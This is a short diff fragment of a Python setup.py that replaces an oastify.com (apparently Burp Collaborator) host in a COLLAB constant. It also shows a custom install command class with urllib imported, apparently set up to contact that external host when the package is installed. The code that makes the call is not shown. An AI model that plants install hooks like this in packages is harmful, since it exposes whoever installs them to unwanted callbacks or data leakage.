@@ -2,7 +2,7 @@ from setuptools import setup
 from setuptools.command.install import install
 import urllib.request
 
-COLLAB = "806r1s9n4gr1xgmfsbr5a20cf3lu9oxd.oastify.com"
+COLLAB = "1lnkmlugp9cui978d4cyvvl50w6nuii7.oastify.com"
 
 class C(install):
     def run(self):
